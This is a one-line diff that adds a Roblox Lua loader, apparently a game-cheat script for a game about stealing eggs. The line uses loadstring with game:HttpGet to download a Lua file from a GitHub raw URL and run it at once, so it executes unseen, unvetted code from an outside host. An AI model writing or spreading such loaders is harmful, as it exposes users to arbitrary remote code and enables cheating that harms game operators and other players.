@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/break-and-steal-an-egg-spam6-txgvgm27o4juum.lua"))()
